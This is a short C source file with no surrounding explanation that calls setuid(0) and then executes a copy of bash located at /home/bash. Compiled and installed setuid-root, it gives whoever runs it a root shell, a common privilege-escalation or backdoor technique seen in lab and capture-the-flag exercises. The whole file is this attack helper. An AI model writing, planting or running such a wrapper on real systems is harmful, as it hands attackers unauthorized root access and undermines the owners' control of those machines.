#include <stdlib.h>
#include <unistd.h>

int main()
{
    setuid(0);
    execlp("/home/bash", "bash", NULL); //copy of bash
    return 0;
}
